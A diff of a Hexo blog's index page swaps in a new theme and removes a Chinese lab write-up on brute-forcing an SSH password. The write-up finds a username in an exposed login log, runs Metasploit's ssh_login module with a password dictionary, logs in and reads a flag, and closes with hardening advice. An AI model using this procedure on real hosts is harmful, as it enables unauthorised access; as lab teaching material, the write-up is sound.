@@ -1,235 +1,196 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en" class="loading">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
-
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    
+<link rel="stylesheet" href="/css/diaspora.css">
 
-  
 <meta name="generator" content="Hexo 5.4.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div class="nav">
+    <ul id="menu-menu" class="menu">
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="//" title="首页" target="_blank" rel="noopener">首页</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/categories/" title="分类" target="_blank" rel="noopener">分类</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/tags/" title="标签" target="_blank" rel="noopener">标签</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/archives/" title="归档" target="_blank" rel="noopener">归档</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/about/" title="关于" target="_blank" rel="noopener">关于</a>
+        </li>
+        
+    </ul>
+	<span class="target"></span>
+	<center>
+	<div class="hitokoto">
+		<span class="typed" id="hitokoto" data-st="true"></span>
+	</div>
+	</center>
+	
+	<p class="footerlinks">
+		<a href="#" class="iconfont icon-null"></a>
+		
+            <a href="/" title="facebook" class="iconfont icon-facebook" target="_blank" rel="noopener"> </a>
+        
+            <a href="/" title="twitter" class="iconfont icon-twitter" target="_blank" rel="noopener"> </a>
+        
+            <a href="/" title="github" class="iconfont icon-github" target="_blank" rel="noopener"> </a>
+        
+            <a href="/img/logo.png" title="wechat" class="iconfont icon-wechat" target="_blank" rel="noopener"> </a>
+        
+            <a href="mailto:xxxx@gmail.com" title="email" class="iconfont icon-email" target="_blank" rel="noopener"> </a>
+        
+		<a href="#" class="iconfont icon-null"></a>
+	</p>
+	
+    <p id="copyright">
+        &copy; 2021 John Doe.
+        <span> | </span>Powered by <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        <span> | </span>Theme <a href="https://github.com/Fechin/hexo-theme-diaspora" title="Diaspora" target="_blank" rel="noopener">Diaspora</a> by Fechin
+		
+		<span> | </span><a rel="nofollow" href="http://www.beian.miit.gov.cn" target="_blank">冀ICP备xxxxxxx号</a>
+		
+    </p>
+</div>
+
+<div id="container">
+    
+<div id="screen">
+    <div id="mark">
+        <div class="layer" data-depth="0.4">
+            <img src="/img/welcome-cover.jpg" id="cover" crossorigin="anonymous" width="1920" height="1080">
+        </div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
+    <div id="vibrant">
+        <svg viewBox="0 0 2880 1620" height="100%" preserveAspectRatio="xMaxYMax slice">
+            <polygon opacity="0.7" points="2000,1620 0,1620 0,0 600,0 "/>
+        </svg>
+        <div></div>
     </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-ssh溯源分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/10/29/ssh%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="article-date">
-  <time class="dt-published" datetime="2021-10-29T14:34:41.937Z" itemprop="datePublished">2021-10-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul>
-<li>操作机： <code>Win10</code></li>
-<li>目标机： <code>Centos7</code></li>
-<li>目标地址： <code>172.16.12.2</code></li>
-<li>目标主机用户名： <code>root</code></li>
-<li>目标主机密码： <code>ICQsafe666</code>    </li>
-</ul>
-<h4 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h4><p><strong>FireFox</strong></p>
-<p>火狐浏览器，用来访问互联网的一款免费网页浏览器，支持安装插件来完成渗透测试工作。</p>
-<p><strong>metasploit-framework</strong></p>
-<p>Metasploit Framework是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试，shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的Ruby编程语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。</p>
-<p><strong>ssh</strong></p>
-<p>SSH是一种网络协议，用于计算机之间的加密登录。</p>
-<p><strong>密码字典</strong></p>
-<p>密码字典，是配合密码破译软件所使用的。密码字典里包括许多人们习惯性设置的密码，这样可以提高密码破译软件的密码破译成功率和命中率，缩短密码破译的时间。</p>
-<h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><h5 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h5><ul>
-<li>利用ssh日志获取用户名，爆破用户密码,以此用户登录</li>
-</ul>
-<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="步骤1：打开目标网站（192-168-38-130-22）"><a href="#步骤1：打开目标网站（192-168-38-130-22）" class="headerlink" title="步骤1：打开目标网站（192.168.38.130:22）"></a>步骤1：打开目标网站（192.168.38.130:22）</h5><p><img src="https://i.loli.net/2021/10/29/SswneztWBFy1fKR.jpg" alt="1.web网页.jpg"></p>
-<h5 id="步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192-168-38-130-22-secure）"><a href="#步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192-168-38-130-22-secure）" class="headerlink" title="步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192.168.38.130:22/secure）"></a>步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192.168.38.130:22/secure）</h5><p><img src="https://i.loli.net/2021/10/29/TiG2ed5q6tWzbkE.png" alt="image-20210728181804581.png"></p>
-<p><img src="https://i.loli.net/2021/10/29/Si7bdKTCEBj3RAL.jpg" alt="2.ssh登录日志.jpg"></p>
-<h5 id="步骤3：打开msf工具准备爆破用户密码"><a href="#步骤3：打开msf工具准备爆破用户密码" class="headerlink" title="步骤3：打开msf工具准备爆破用户密码"></a>步骤3：打开msf工具准备爆破用户密码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/JKSjeg8nHlMauiW.jpg" alt="3.msf.jpg"></p>
-<h5 id="步骤4：搜索msf里ssh-login的相关工具和攻击载荷。"><a href="#步骤4：搜索msf里ssh-login的相关工具和攻击载荷。" class="headerlink" title="步骤4：搜索msf里ssh_login的相关工具和攻击载荷。"></a>步骤4：搜索msf里ssh_login的相关工具和攻击载荷。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ssh_login</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/4ScP3d8tQ1G7KvA.jpg" alt="4.msf搜索ssh爆破工具.jpg"></p>
-<h5 id="步骤5：打开msf里的ssh工具"><a href="#步骤5：打开msf里的ssh工具" class="headerlink" title="步骤5：打开msf里的ssh工具"></a>步骤5：打开msf里的ssh工具</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/B7FgmtY8Za3A5i6.jpg" alt="5.jpg"></p>
-<h5 id="步骤6：查看需要设置的相关项，“yes”表示必须填写的参数"><a href="#步骤6：查看需要设置的相关项，“yes”表示必须填写的参数" class="headerlink" title="步骤6：查看需要设置的相关项，“yes”表示必须填写的参数"></a>步骤6：查看需要设置的相关项，“yes”表示必须填写的参数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/x58Qgovp2F9wLKS.png" alt="image-20210728190621525.png"></p>
-<h5 id="步骤7：修改相关参数"><a href="#步骤7：修改相关参数" class="headerlink" title="步骤7：修改相关参数"></a>步骤7：修改相关参数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set VERBOSE true  //显示攻击日志</span><br><span class="line">set PASS_FILE D:/library.txt  //载入密码字典</span><br><span class="line">set THREADS 10  //设置线程</span><br><span class="line">set RHOSTS 192.168.38.130  //设置目标主机ip</span><br><span class="line">set USERNAME icq  //设置登录用户名icq</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/U2MRNGjhe8Sq9Vy.jpg" alt="7.jpg"></p>
-<h5 id="步骤8：在终端中输入“run”-开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq-密码为p-ssword。"><a href="#步骤8：在终端中输入“run”-开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq-密码为p-ssword。" class="headerlink" title="步骤8：在终端中输入“run”, 开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq,密码为p@ssword。"></a>步骤8：在终端中输入“run”, 开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq,密码为p@ssword。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/1bWE4TmkHYuMU9X.jpg" alt="8.jpg"></p>
-<h5 id="步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p-ssword”远程登录目标主机"><a href="#步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p-ssword”远程登录目标主机" class="headerlink" title="步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p@ssword”远程登录目标主机"></a>步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p@ssword”远程登录目标主机</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh icq@192.168.38.130</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/3XJC5qEemcPN2bW.jpg" alt="9.jpg"></p>
-<h5 id="步骤10：使用命令查看用户父目录，发现flag文件夹"><a href="#步骤10：使用命令查看用户父目录，发现flag文件夹" class="headerlink" title="步骤10：使用命令查看用户父目录，发现flag文件夹"></a>步骤10：使用命令查看用户父目录，发现flag文件夹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/5HIbmduAj7nPVWO.jpg" alt="10.jpg"></p>
-<h5 id="步骤11：使用cat命令查看flag"><a href="#步骤11：使用cat命令查看flag" class="headerlink" title="步骤11：使用cat命令查看flag"></a>步骤11：使用cat命令查看flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/29/x58Qgovp2F9wLKS.png" alt="image-20210728190621525.png"></p>
-<h4 id="实验结果分析与总结"><a href="#实验结果分析与总结" class="headerlink" title="实验结果分析与总结"></a>实验结果分析与总结</h4><p>在本次实验中，利用ssh登录日志分析出成功登录用户的用户名，再利用msf工具中的ssh暴力破解板块对用户密码进行破解，最后通过ssh远程登陆目标主机，在父目录下找到flag。</p>
-<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>当我们注册密码时，应该使用强密码。</p>
-<p>应该将ssh登录日志查看权限提高到管理员权限。</p>
-
-      
+    <div id="header">
+        <div>
+            <a class="image-logo" href="/"></a>
+			
+            <div class="iconfont icon-menu switchmenu"></div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/29/ssh%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" data-id="ckvcigt44000078w70wpj0fdh" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
+    
+    <div id="post0">
+        <p>十月 29, 2021</p>
+        <h2><a href="/2021/10/29/ssh%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" title="Hexo" class="posttitle">Hexo</a></h2>
+        <p class="summary">实验环境
+操作机： Win10
+目标机： Centos7
+目标地址： 172.16.12.2
+目标主机用户名： r...</p>
+    </div>
+    
+</div>
 
-
-
-  
-
-
-</section>
+    <div id="primary">
         
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li></ul>
     </div>
-  </div>
-
-
-  
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2021/10/29/ssh%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/">(no title)</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2021 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.4.1.min.js"></script>
+</div>
+<div id="preview"></div>
 
 
 
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
 </body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
 </html>
